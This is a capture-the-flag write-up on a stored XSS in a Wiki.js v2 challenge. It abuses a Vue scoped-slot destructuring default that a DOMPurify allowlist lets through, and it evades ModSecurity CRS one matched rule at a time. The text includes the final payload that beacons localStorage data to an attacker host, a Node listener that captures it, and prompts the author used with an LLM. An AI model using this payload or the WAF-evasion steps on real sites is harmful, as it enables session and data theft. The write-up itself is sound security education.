---
title: "Duck Wiki"
date: "2026-06-28"
author: "tungdlm99"
ctf: "V1t CTF 2026"
category: web
difficulty: hard
points: 0
flag_format: "v1t{...}"
tags: [ctf, v1t-ctf-2026, web, ai-assisted]
draft: false
summary: "Stored XSS in Wiki.js via a Vue scoped-slot destructuring-default SSTI, chained with an incremental ModSecurity CRS bypass to exfiltrate the bot's localStorage flag."
icon: "🦆"
---

## Summary

Duck Wiki is a Wiki.js v2 instance ("Wikipedia for duck") fronted by an OWASP ModSecurity CRS proxy and visited by a Puppeteer bot that holds the flag in `localStorage.FLAG`. The intended bug is a **client-side template injection in Vue 2**: DOMPurify allowlists `<tabset>` and `v-slot:*` to support Wiki.js's tabs feature, but a **destructuring default in a scoped-slot binding** (`v-slot:content="{x=EVIL}"`) executes arbitrary JS because the slot is invoked with an empty props object. The rest of the challenge is steering a payload past CRS 4.27 at PL1 one matched rule at a time until the anomaly score is zero, then having the bot's session beacon the flag to an attacker host.

I'll be honest about how this one got solved: an LLM did almost all of the grinding — it knew the Vue scoped-slot trick existed, it wrote the harness, and it iterated the WAF bypass against the audit log far faster than I would have by hand. My job was recognition (this is a *Vue runtime-compiler* DOMPurify bypass, not a generic XSS), judgment (rejecting its first few "clever" payloads that were never going to fire), and verification (actually watching the beacon land). This writeup is deep on the technique *and* deliberate about which prompts moved the needle.

## Solution

### Mapping the target before writing a single payload

The deployment is three containers:

- `ghcr.io/requarks/wiki:2` — Wiki.js v2, the app.
- An `owasp/modsecurity-crs:nginx` proxy — CRS **4.27, Paranoia Level 1**, sitting in front.
- A Puppeteer XSS bot — logs in as the *assistant* account (JWT cookie), takes attacker HTML, creates a `bot/<slug>` page with `editor: "code"`, and visits it.

The flag is not in the database or a file. It lives in the **bot browser's `localStorage`**, under key `FLAG`, on the `app.local:3000` origin, set by the bot before it navigates to our page. The remote only exposes the bot-submission form: `POST html=` (urlencoded), routed through the CRS proxy. There is no admin panel for us, no file read, no SSRF target. So the whole challenge collapses to one sentence:

> Get JavaScript to run in the bot's authenticated session, read `localStorage.FLAG`, and send it somewhere I control — and get that payload through CRS with a final anomaly score of 0.

Two sub-problems, and they fight each other: the cleaner the JS, the harder it is to make it execute through DOMPurify; the more powerful the JS, the more CRS rules it trips. The art is the intersection.

### Why DOMPurify doesn't save Wiki.js here

Wiki.js renders page body content into `#root`, and `#root` is mounted by the **full Vue 2 build** — the one that ships the runtime *template compiler*. That single fact is the foundation of the whole bug:

- The full build means Vue will compile template strings at runtime, so the page's HTML directives (`v-slot`, `v-pre`, `v-if`, …) are *live*, not inert markup.
- The runtime compiler requires `unsafe-eval`, and there is **no CSP** on this origin, so `eval`/`Function` are available — which matters for how we think about exec.

Between attacker input and the DOM sits the `html-security` layer running **DOMPurify 2.4.3**. By default DOMPurify would strip everything dangerous. But Wiki.js needs its legitimate `<tabset>` tabs component to survive sanitization, so it widens the allowlist:

```text
ADD_TAGS: [tabset, template]
ADD_ATTR: [v-pre, v-slot:tabs, v-slot:content, target]
```

This is the entire vulnerability. DOMPurify is a *DOM* sanitizer — it reasons about tags and attributes, not about what Vue will later *do* with those attributes. By allowlisting `<tabset>`, `<template>`, and `v-slot:content`, the app hands Vue exactly the ingredients it needs to compile and execute a scoped slot.

Note the deliberate-looking defense that *fails*: `v-pre` is allowlisted, presumably to neutralize `{{ }}` interpolation. And it does — but only for **text-node interpolation**. `v-pre` tells Vue "skip compilation for this element and its children," which kills `{{ }}` mustaches. It does **nothing** to a `v-slot` binding expression, because that expression is part of how the *parent* (`<tabset>`) compiles its scoped slot. The guard is real but aimed at the wrong primitive.

### The exec primitive: scoped-slot destructuring defaults

Here is the minimal trigger:

```html
<tabset><template v-slot:content="{x=EVIL}"></template></tabset>
```

Why this works, step by step:

1. `<tabset>` is a real Wiki.js component. Internally it renders `<slot name="content">`, i.e. it *invokes* the content slot.
2. A scoped slot is compiled to a **function** whose single parameter is the slot props object. The binding `v-slot:content="{x=EVIL}"` becomes, roughly, `function ({x = EVIL}) { /* render */ }`.
3. `<tabset>` calls that function with the slot props. Crucially, for the `content` slot it passes **`{}`** (an empty object) — no `x` key.
4. In JS, a destructuring **default** fires precisely when the property is missing. `({x = EVIL}) => {}` invoked with `{}` means `x` is `undefined`, so the default expression `EVIL` is **evaluated**. That evaluation is arbitrary code execution.

This is the part that's easy to get subtly wrong, and it's where I had to overrule the model's first instincts (more on that in the Lessons section). The shape matters:

- **Object destructuring with a default** (`{x=EVIL}`) fires, because the prop is missing from `{}`. ✅
- A **plain single-param default** like `v-slot:content="props=EVIL"` does **not** fire — the slot is always called *with* an argument (`{}`), so `props` is `{}`, not `undefined`; the default never triggers. ❌
- **Array destructuring** (`[x=EVIL]`) does **not** fire either — props is an object, not an iterable, so the array default never engages. ❌

So the reliable primitive is specifically: *object destructuring, default value, against an empty props object.* `EVIL` runs exactly once, at compile/render time, in the bot's origin and session.

### What `EVIL` has to do, and the CRS constraints on it

`EVIL` needs to read `localStorage.FLAG` and beacon it out. The naive version is trivial JS:

```js
fetch('https://ATTACKER/'+localStorage.FLAG)
```

…and it's also a CRS piñata. The submission goes `POST html=<payload>` through CRS 4.27 PL1, and the goal is **total anomaly score 0** (the proxy blocks at the default threshold). The way you actually do this is not to guess — you enable the audit log, submit, read which rule IDs matched, rewrite *one construct*, and repeat. The local `docker-compose.override.yml` turns on the CRS audit log to stdout so `docker compose logs proxy` prints the matched IDs.

Here is the bypass, rule by rule, which is the real meat of the challenge:

| What tripped it | Rule(s) | Fix |
|---|---|---|
| Call names `fetch(`, `eval(`, `alert(`, … | 941390 (JS function-name XSS) | Use **assignment, no listed call name**. `new Image().src = …` performs a GET with no allowlisted call. `Image` and `encodeURIComponent` are not on the function-name list. |
| `${...}` template-literal interpolation | 932130 (unix cmd) + 933135 (php) | Drop template interpolation entirely; build the URL with **`+` string concatenation**. |
| `'...://...'` — quoted string containing a protocol/`://` | 942100 (libinjection) + 942550 | Use **backtick** strings instead of single/double quotes (backticks aren't SQL delimiters), and a **protocol-relative** `//host` URL so there's no `://`. |
| `"{...}"` — a brace sitting right next to a closing quote | 942550 alt | Make the `}` not adjacent to the quote by **appending a second slot param after it**: `…},z`. |

Each of these is a small, independent edit. The discipline is what makes it tractable: never rewrite the whole payload, only the one construct the audit log just flagged, then re-submit and re-read.

Walking the transformations on the exec sink:

- `fetch(...)` → `new Image().src = ...` — exfil via image GET, zero blocked call names.
- `'https://ATTACKER/'+...` → `` `//ATTACKER/img/`+... `` — backtick + protocol-relative kills libinjection and the `://` heuristics.
- `${localStorage.FLAG}` → `+encodeURIComponent(localStorage.FLAG)` — `+` concat instead of interpolation; `encodeURIComponent` makes the brace-bearing flag URL-safe and is itself not a flagged name.
- trailing `},z` — second destructuring param so the `}` from `{x=…}` isn't kissing the closing `"`.

### The final payload

```html
<tabset><template v-slot:content="{x=new Image().src=`//ATTACKER/img/`+encodeURIComponent(localStorage.FLAG)},z"></template></tabset>
```

Reading it as code: the slot function is `function ({ x = (new Image().src = ` + "`//ATTACKER/img/`" + ` + encodeURIComponent(localStorage.FLAG)), z }) {}`. Called with `{}`, both `x` and `z` are missing; `x`'s default expression runs, which sets an `Image`'s `src` to `//ATTACKER/img/<urlencoded flag>`, firing the GET. `z` has no default and is harmless — it exists purely to push `}` off the quote.

### End-to-end: from challenge data to printed flag

The repeatable path: stand up a listener, point `ATTACKER` at it, submit the payload through the form (locally direct, remotely through a real browser because Cloudflare's bot challenge sits in front of the CRS proxy), and read the flag out of the captured request path. This single Node script is the whole exfil side — it serves the beacon endpoint and prints the flag the instant the bot's `new Image()` request lands:

```js
// listener.mjs — run: node listener.mjs   (then expose :8000 to the bot, e.g. via a tunnel)
// The bot's payload does: new Image().src = `//<this-host>/img/` + encodeURIComponent(localStorage.FLAG)
import http from 'node:http';

const PORT = 8000;

http.createServer((req, res) => {
  // Always answer fast so the Image() request completes cleanly.
  res.writeHead(200, { 'content-type': 'image/gif', 'access-control-allow-origin': '*' });
  res.end(Buffer.from('R0lGODlhAQABAAAAACw=', 'base64')); // 1x1 gif

  // We expect: GET /img/<urlencoded flag>
  const m = req.url.match(/^\/img\/(.+)$/);
  if (!m) return;
  let flag;
  try { flag = decodeURIComponent(m[1]); } catch { flag = m[1]; }
  console.log('[beacon] from', req.socket.remoteAddress, '->', flag);
  if (/^v1t\{.*\}$/.test(flag)) {
    console.log('\n========================================');
    console.log('  FLAG:', flag);
    console.log('========================================\n');
  }
}).listen(PORT, () => {
  console.log(`listening on :${PORT}`);
  console.log('Submit this as html= through the Duck Wiki bot form (ATTACKER = this host):\n');
  console.log('<tabset><template v-slot:content="{x=new Image().src=`//ATTACKER/img/`+encodeURIComponent(localStorage.FLAG)},z"></template></tabset>\n');
});
```

Run order:

1. `node listener.mjs`, then make `:8000` reachable from the bot (local: `host.docker.internal`; remote: a public tunnel such as `webhook.site` or your own VPS).
2. Replace `ATTACKER` in the payload with that host and submit it as `html=` via the bot form. Locally you can POST straight through CRS; on the remote you submit in a **real browser** (or replay the request with a valid `cf_clearance` cookie + matching User-Agent), because Cloudflare's bot challenge fronts the CRS proxy.
3. The bot creates `bot/<slug>`, visits it, Vue compiles the scoped slot, the destructuring default fires, `localStorage.FLAG` is read and beaconed. The listener prints it.

The captured path is `/img/v1t%7Bsm4rty_w1k1_duck%7D`, which decodes to the flag.

To prove the exec/sanitization survival *before* spending a remote submission, the local harness has two more pieces worth keeping: `render.mjs` (admin login → create the page → dump the post-DOMPurify `render` output, so you can confirm `<tabset>`/`v-slot:content` actually survived sanitization) and `verify.mjs` (real Chrome, assistant JWT cookie + a seeded `localStorage.FLAG`, confirms the payload executes and the beacon fires). That local loop is what makes the remote a one-shot.

## Flag

```
v1t{sm4rty_w1k1_duck}
```

## Lessons learned - prompting the AI

This is the section I actually care about, because the win here wasn't knowing Vue internals cold — it was driving an LLM to the answer without letting it wander. Duck Wiki is a *two-stage* puzzle (a framework-specific exec primitive, then an iterative WAF bypass), and each stage rewards a different prompting posture.

**1. Make the model name the exact primitive, not "an XSS."** My first useful prompt pinned down the stack and forced specificity:

> "Wiki.js v2 sanitizes with DOMPurify but allowlists `ADD_TAGS:[tabset,template]` and `ADD_ATTR:[v-pre,v-slot:tabs,v-slot:content,target]`, and `#root` is mounted by the full Vue 2 build with the runtime compiler and no CSP. Given that, what is the *minimal* client-side template injection? Show the exact compiled function the slot binding becomes and explain when its default expression actually runs."

Forcing it to "show the compiled function" is what surfaced the real insight: the slot is invoked with `{}`, so only an **object-destructuring default** fires. Without that demand, the model happily proposed plausible-looking variants.

**2. Tell it which dead-ends to avoid — by mechanism, not just "don't."** The model's early payloads tried `v-slot:content="props=alert(1)"` and `[x=...]`. I corrected with the *reason*:

> "The slot is always called with an argument (`{}`), so a single-param default like `props=EVIL` will never trigger and array destructuring won't either — props is an object, not iterable. Only `{x=EVIL}` fires. Rewrite using object-destructuring default and assume the exfil sink must avoid named calls."

Giving the model the *mechanism* (always-called-with-`{}`) stopped it regenerating the same broken shapes. Generic "that's wrong, try again" just made it churn.

**3. Drive the WAF bypass off the audit log, one rule at a time — never let it guess.** The single most effective instruction for stage two:

> "Here are the matched CRS rule IDs from the audit log: 941390, 932130, 942550. Do NOT rewrite the whole payload. For each ID, identify the offending construct and change only that: no allowlisted call names (so no `fetch`/`eval`/`alert` — use `new Image().src=`), `+` concat instead of `${}`, backticks + protocol-relative `//host` instead of quoted `://`, and keep `}` off the closing quote. Output the new payload and predict which IDs should now be clear."

Two things made this work: feeding **real rule IDs** (the model is excellent at mapping a CRS ID to its trigger) and the hard constraint **"change only that construct."** Left unconstrained, it rewrote everything each round and reintroduced rules I'd already cleared.

**How I caught its mistakes and verified.** I never trusted "this should work." Three concrete checks: (a) `render.mjs` to confirm the payload *survived DOMPurify* — twice the model gave me a payload DOMPurify silently stripped, which no amount of CRS-bypassing would fix; (b) re-running the submission and re-reading `docker compose logs proxy` to confirm the anomaly score was genuinely 0, not "probably fine"; (c) `verify.mjs` in real Chrome with a seeded `localStorage.FLAG` to watch the beacon actually land before burning the remote one-shot. The model is fast but overconfident; the harness is the ground truth.

**Fast-path prompt recipe for next time:** *"Identify the exact framework exec primitive (show the compiled form and when it fires), give the model the mechanism behind each dead-end so it stops regenerating them, then bypass the WAF strictly off real matched rule IDs — one construct per round — and verify every claim against a local render + audit-log + real-browser harness before trusting it."*
